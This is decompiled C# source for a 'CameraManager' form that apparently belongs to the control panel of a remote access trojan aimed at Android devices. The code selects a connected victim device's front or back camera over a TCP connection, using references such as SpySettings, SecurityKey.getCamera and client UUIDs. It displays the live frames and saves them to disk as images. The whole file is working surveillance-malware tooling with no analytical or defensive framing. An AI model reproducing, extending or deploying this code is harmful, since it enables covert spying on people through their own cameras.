using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000040 RID: 64
[DesignerGenerated]
public partial class CameraManager : Form
{
	// Token: 0x060002CE RID: 718 RVA: 0x0004ACB4 File Offset: 0x00048EB4
	public CameraManager()
	{
		base.Load += this.CameraManager_Load;
		base.FormClosing += this.CameraManager_FormClosing;
		this.Title = "null";
		this.MouseState = false;
		this.FPS = 0;
		this.FPSTMP = 0;
		this.SizeFrame = "0 kb";
		this.TempImage = null;
		this.KEYsx = "None";
		this.tmpFolderUSER = "";
		this.boSave = false;
		this.Rotateit = false;
		this.SelectedCamera = "";
		this.CamerID = "null";
		this.Changed = false;
		this.frameRate = 25;
		this.newphoto = false;
		this.keepmeto = false;
		this.InitializeComponent();
	}

	// Token: 0x060002D1 RID: 721 RVA: 0x0004CB08 File Offset: 0x0004AD08
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x060002D2 RID: 722 RVA: 0x0004CB50 File Offset: 0x0004AD50
	public void addsizes(object[] objs)
	{
		if (base.InvokeRequired)
		{
			CameraManager.addsizedele method = new CameraManager.addsizedele(this.addsizes);
			base.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			string[] array = (string[])objs[0];
			if (array != null && array.Length != 0)
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					this.combosizes.Items.Add(text.Replace("[", "").Replace("]", ""));
				}
				this.combosizes.Text = array[0];
				this.combosizes.MaxDropDownItems = array.Length;
			}
		}
	}

	// Token: 0x060002D3 RID: 723 RVA: 0x0004CC10 File Offset: 0x0004AE10
	private void tranlsateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.startbtn.Text = Codes.Translate(this.startbtn.Text, "en", "zh");
				this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, "en", "zh");
				this.combotext.Text = Codes.Translate(this.combotext.Text, "en", "zh");
				this.qultytext.Text = Codes.Translate(this.qultytext.Text, "en", "zh");
			}
		}
		else
		{
			this.startbtn.Text = Codes.Translate(this.startbtn.Text, "en", "ar");
			this.Sbtn.Text = Codes.Translate(this.Sbtn.Text, "en", "ar");
			this.combotext.Text = Codes.Translate(this.combotext.Text, "en", "ar");
			this.qultytext.Text = Codes.Translate(this.qultytext.Text, "en", "ar");
		}
	}

	// Token: 0x060002D4 RID: 724 RVA: 0x0004CD78 File Offset: 0x0004AF78
	private void CameraManager_Load(object sender, EventArgs e)
	{
		base.Tag = "Cam_" + this.classClient.UUID;
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\6.ico");
		this.cmbofoucs.Text = "No";
		this.Frames.Start();
		this.ClientPic.Image = this.classClient.Wallpaper;
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.tranlsateme();
		base.Focus();
		this.TOpacity.Enabled = true;
		IntPtr hWndInsertAfter = new IntPtr(-2);
		CameraManager.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
		this.keepmeto = true;
	}

	// Token: 0x060002D5 RID: 725 RVA: 0x00002728 File Offset: 0x00000928
	private void Frames_Tick(object sender, EventArgs e)
	{
		this.FPS = this.FPSTMP;
		this.FPSTMP = 0;
		this.SizeFrame = "0 kb";
	}

	// Token: 0x060002D6 RID: 726 RVA: 0x0000206C File Offset: 0x0000026C
	private void CAM0_MouseHover(object sender, EventArgs e)
	{
	}

	// Token: 0x060002D7 RID: 727 RVA: 0x0000206C File Offset: 0x0000026C
	private void CAM0_MouseLeave(object sender, EventArgs e)
	{
	}

	// Token: 0x060002D8 RID: 728 RVA: 0x00002748 File Offset: 0x00000948
	public void UpdateFPS()
	{
		base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
		{
			this.newphoto = true;
			this.fpstext.Text = string.Concat(new string[]
			{
				" FPS : <",
				Conversions.ToString(this.FPS),
				"> - SPEED : <",
				this.SizeFrame,
				">"
			});
		}));
	}

	// Token: 0x060002D9 RID: 729 RVA: 0x0004CE44 File Offset: 0x0004B044
	public Image RotateFlip(Image imag)
	{
		try
		{
			this.TempImage.Image = imag;
			if (this.TempImage != null)
			{
				string keysx = this.KEYsx;
				string a = keysx;
				if (!(a == "Down"))
				{
					if (!(a == "Up"))
					{
						if (!(a == "Left"))
						{
							if (a == "Right")
							{
								this.TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
								this.TempImage.Tag = "90n";
							}
						}
						else
						{
							this.TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
							this.TempImage.Tag = "270n";
						}
					}
					else
					{
						this.TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
						this.TempImage.Tag = "180x";
					}
				}
				else
				{
					this.TempImage.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
					this.TempImage.Tag = "180y";
				}
				return this.TempImage.Image;
			}
		}
		catch (Exception)
		{
		}
		return null;
	}

	// Token: 0x060002DA RID: 730 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button4_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060002DB RID: 731 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button3_Click(object sender, EventArgs e)
	{
	}

	// Token: 0x060002DC RID: 732 RVA: 0x0004CF60 File Offset: 0x0004B160
	private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		this.boSave = false;
		this.DrakeUILampLED1.Enabled = false;
		this.DrakeUILampLED1.Visible = false;
		this.DrakeUILampLED1.Blink = false;
		this.Frames.Stop();
		this.Frames.Dispose();
		this.DrakeUILampLED1.Dispose();
		this.Frames.Enabled = false;
		if (this.Changed && this.classCamera != null)
		{
			this.classCamera.qit = true;
			this.classCamera.Close(this.classCamera.myClient);
		}
	}

	// Token: 0x060002DD RID: 733 RVA: 0x0004D000 File Offset: 0x0004B200
	public void Selected(string V)
	{
		try
		{
			if (this.classClient != null && Operators.CompareString(this.CamerID, "null", false) != 0)
			{
				Client client = this.classClient;
				TcpClient client2 = this.Client;
				string[] array = client.Keys.Split(new char[]
				{
					':'
				});
				int value = (Operators.CompareString(this.cmbofoucs.Text, "Yes", false) == 0) ? 1 : 0;
				int value2 = 1;
				string text = "";
				string text2 = "";
				try
				{
					if (this.combosizes.Visible)
					{
						string[] array2 = this.combosizes.Text.Split(new char[]
						{
							'x'
						});
						text = array2[0];
						text2 = array2[1];
					}
				}
				catch (Exception)
				{
					text = Conversions.ToString(460);
					text2 = Conversions.ToString(840);
				}
				string text3 = this.comboqualty.Text;
				if (client.Isv4)
				{
					object[] parametersObjects = new object[]
					{
						client2,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							V,
							",",
							text,
							",",
							text2,
							",",
							text3,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.getCamera,
							Data.SPL_SOCKET,
							Conversions.ToString(value),
							Data.SPL_SOCKET,
							Conversions.ToString(value2),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects);
				}
				else
				{
					object[] parametersObjects2 = new object[]
					{
						client2,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							V,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.getCamera,
							Data.SPL_SOCKET,
							Conversions.ToString(value),
							Data.SPL_SOCKET,
							Conversions.ToString(value2),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							client.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						client
					};
					client.SendMessage(parametersObjects2);
				}
				this.CAM0.Image = Resources.onloading;
				this.statustext.Text = "Please Wait....";
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060002DE RID: 734 RVA: 0x0004D308 File Offset: 0x0004B508
	private void DrakeUIButton2_Click(object sender, EventArgs e)
	{
		if (this.Changed)
		{
			this.Changed = false;
			if (this.classCamera != null)
			{
				this.statustext.Text = "Select Camera...";
				this.classCamera.qit = true;
				this.classCamera.Close(this.classCamera.myClient);
			}
		}
		this.startbtn.Enabled = true;
		this.CAM0.Image = null;
		this.Sbtn.Enabled = false;
		this.Button3.Enabled = false;
	}

	// Token: 0x060002DF RID: 735 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButton1_Click_2(object sender, EventArgs e)
	{
	}

	// Token: 0x060002E0 RID: 736 RVA: 0x0000206C File Offset: 0x0000026C
	private void DrakeUIButton2_Click_1(object sender, EventArgs e)
	{
	}

	// Token: 0x060002E1 RID: 737 RVA: 0x0004D394 File Offset: 0x0004B594
	private void Addpo_Click(object sender, EventArgs e)
	{
		if (this.CAM0.Image != null)
		{
			if (Operators.CompareString(this.Button3.Tag.ToString(), "off", false) == 0)
			{
				this.DrakeUILampLED1.Enabled = true;
				this.DrakeUILampLED1.Visible = true;
				this.DrakeUILampLED1.Blink = true;
				this.Button3.Tag = "on";
				this.savetimer.Start();
				this.Button3.Text = "ON";
				this.Button3.ForeColor = Color.Lime;
				this.boSave = true;
			}
			else if (Operators.CompareString(this.Button3.Tag.ToString(), "on", false) == 0)
			{
				this.DrakeUILampLED1.Enabled = false;
				this.DrakeUILampLED1.Visible = false;
				this.DrakeUILampLED1.Blink = false;
				this.Button3.Tag = "off";
				this.Button3.ForeColor = Color.FromArgb(157, 5, 17);
				this.savetimer.Stop();
				this.Button3.Text = "Save";
				string text = this.tmpFolderUSER + "\\Camera Manager";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
				this.Button3.ForeColor = Color.White;
				this.Button3.BackColor = Color.Transparent;
				this.boSave = false;
			}
		}
	}

	// Token: 0x060002E2 RID: 738 RVA: 0x0004D51C File Offset: 0x0004B71C
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (this.CAM0.Image != null)
		{
			if (Operators.CompareString(this.KEYsx, "Right", false) == 0)
			{
				this.KEYsx = "Down";
			}
			else if (Operators.CompareString(this.KEYsx, "Down", false) == 0)
			{
				this.KEYsx = "Left";
			}
			else if (Operators.CompareString(this.KEYsx, "Left", false) == 0)
			{
				this.KEYsx = "Up";
			}
			else if (Operators.CompareString(this.KEYsx, "Up", false) == 0)
			{
				this.KEYsx = "Right";
			}
			else
			{
				this.KEYsx = "Right";
			}
		}
	}

	// Token: 0x060002E3 RID: 739 RVA: 0x0004D5D4 File Offset: 0x0004B7D4
	private void Savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = this.tmpFolderUSER + "\\Camera Manager";
			if (this.boSave)
			{
				if (this.newphoto)
				{
					this.newphoto = false;
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(text))
					{
						this.CAM0.Image.Save(text + "\\p_" + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg", ImageFormat.Jpeg);
					}
				}
			}
			else
			{
				this.savetimer.Stop();
				this.savetimer.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060002E4 RID: 740 RVA: 0x0004D68C File Offset: 0x0004B88C
	private void DrakeUIButton1_Click_3(object sender, EventArgs e)
	{
		string text = this.combocam.Text;
		if (Operators.CompareString(text, "Front", false) != 0)
		{
			if (Operators.CompareString(text, "Back", false) == 0)
			{
				this.statustext.Text = "Selected : Back Camera, Please Wait...";
				this.Sbtn.Enabled = true;
				this.startbtn.Enabled = false;
				this.CamerID = "0";
				this.Selected("0");
				this.SelectedCamera = "Back Camera";
			}
		}
		else
		{
			this.statustext.Text = "Selected : Front Camera, Please Wait...";
			this.Sbtn.Enabled = true;
			this.startbtn.Enabled = false;
			this.CamerID = "1";
			this.Selected("1");
			this.SelectedCamera = "Front Camera";
		}
	}

	// Token: 0x060002E5 RID: 741 RVA: 0x0004D760 File Offset: 0x0004B960
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.hidetoolbtn.TagString, "s", false) == 0)
		{
			this.hidetoolbtn.TagString = "h";
			this.Panel2.Enabled = false;
			this.Panel2.Visible = false;
		}
		else
		{
			this.hidetoolbtn.TagString = "s";
			this.Panel2.Enabled = true;
			this.Panel2.Visible = true;
		}
	}

	// Token: 0x060002E6 RID: 742
	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	// Token: 0x060002E7 RID: 743 RVA: 0x0004D7DC File Offset: 0x0004B9DC
	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (this.keepmeto)
		{
			this.pinbtn.ForeColor = Color.Lime;
			IntPtr hWndInsertAfter = new IntPtr(-1);
			CameraManager.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
			this.keepmeto = false;
		}
		else
		{
			this.pinbtn.ForeColor = Color.Red;
			IntPtr hWndInsertAfter = new IntPtr(-2);
			CameraManager.SetWindowPos(base.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
			this.keepmeto = true;
		}
	}

	// Token: 0x060002E8 RID: 744 RVA: 0x0004D68C File Offset: 0x0004B88C
	private void drakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		string text = this.combocam.Text;
		if (Operators.CompareString(text, "Front", false) != 0)
		{
			if (Operators.CompareString(text, "Back", false) == 0)
			{
				this.statustext.Text = "Selected : Back Camera, Please Wait...";
				this.Sbtn.Enabled = true;
				this.startbtn.Enabled = false;
				this.CamerID = "0";
				this.Selected("0");
				this.SelectedCamera = "Back Camera";
			}
		}
		else
		{
			this.statustext.Text = "Selected : Front Camera, Please Wait...";
			this.Sbtn.Enabled = true;
			this.startbtn.Enabled = false;
			this.CamerID = "1";
			this.Selected("1");
			this.SelectedCamera = "Front Camera";
		}
	}

	// Token: 0x060002E9 RID: 745 RVA: 0x0004D308 File Offset: 0x0004B508
	private void drakeUIButtonIcon1_Click_2(object sender, EventArgs e)
	{
		if (this.Changed)
		{
			this.Changed = false;
			if (this.classCamera != null)
			{
				this.statustext.Text = "Select Camera...";
				this.classCamera.qit = true;
				this.classCamera.Close(this.classCamera.myClient);
			}
		}
		this.startbtn.Enabled = true;
		this.CAM0.Image = null;
		this.Sbtn.Enabled = false;
		this.Button3.Enabled = false;
	}

	// Token: 0x04000356 RID: 854
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CAM0")]
	private PictureBox _CAM0;

	// Token: 0x04000357 RID: 855
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Frames")]
	private Timer _Frames;

	// Token: 0x04000358 RID: 856
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	// Token: 0x04000359 RID: 857
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Sbtn")]
	private DrakeUIButton _Sbtn;

	// Token: 0x0400035A RID: 858
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private DrakeUIAvatar _Button3;

	// Token: 0x0400035B RID: 859
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x0400035C RID: 860
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private Timer _savetimer;

	// Token: 0x0400035D RID: 861
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButton _startbtn;

	// Token: 0x0400035E RID: 862
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidetoolbtn")]
	private DrakeUIButtonIcon _hidetoolbtn;

	// Token: 0x0400035F RID: 863
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	// Token: 0x04000360 RID: 864
	public Client classCamera;

	// Token: 0x04000361 RID: 865
	public TcpClient Client;

	// Token: 0x04000362 RID: 866
	public Client classClient;

	// Token: 0x04000363 RID: 867
	public string Title;

	// Token: 0x04000364 RID: 868
	private bool MouseState;

	// Token: 0x04000365 RID: 869
	public int FPS;

	// Token: 0x04000366 RID: 870
	public int FPSTMP;

	// Token: 0x04000367 RID: 871
	public string SizeFrame;

	// Token: 0x04000368 RID: 872
	public PictureBox TempImage;

	// Token: 0x04000369 RID: 873
	public string KEYsx;

	// Token: 0x0400036A RID: 874
	public string tmpFolderUSER;

	// Token: 0x0400036B RID: 875
	public bool boSave;

	// Token: 0x0400036C RID: 876
	public bool Rotateit;

	// Token: 0x0400036D RID: 877
	public string SelectedCamera;

	// Token: 0x0400036E RID: 878
	public string CamerID;

	// Token: 0x0400036F RID: 879
	public bool Changed;

	// Token: 0x04000370 RID: 880
	private int frameRate;

	// Token: 0x04000371 RID: 881
	private bool newphoto;

	// Token: 0x04000372 RID: 882
	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	// Token: 0x04000373 RID: 883
	private const uint SWP_NOMOVE = 2U;

	// Token: 0x04000374 RID: 884
	private bool keepmeto;

	// Token: 0x02000041 RID: 65
	// (Invoke) Token: 0x060002ED RID: 749
	public delegate void addsizedele(object[] objs);
}
